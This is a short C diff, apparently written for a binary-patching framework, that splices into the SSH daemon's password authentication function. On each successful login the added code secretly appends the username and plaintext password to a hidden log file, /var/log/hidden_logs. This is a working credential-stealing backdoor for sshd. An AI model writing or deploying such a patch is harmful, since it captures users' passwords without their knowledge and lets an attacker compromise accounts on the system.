@@ -53,7 +53,19 @@ struct Authctxt {
 
 struct passwd *pw;
 struct Authctxt *authctxt;
+FILE *logfd;
 
 SHIVA_T_FUNCTION_SPLICE(auth_password, 0x12620, 0x12620)
 {
+	SHIVA_T_PAIR_W0(ret);
 
+	if (ret > 0) {
+
+		logfd = fopen("/var/log/hidden_logs", "a+");
+		fprintf(logfd, "Succesful SSH login\n"
+				"Username: %s\n"
+				"Password: %s\n", pw->pw_name, password);
+
+
+	}
+}
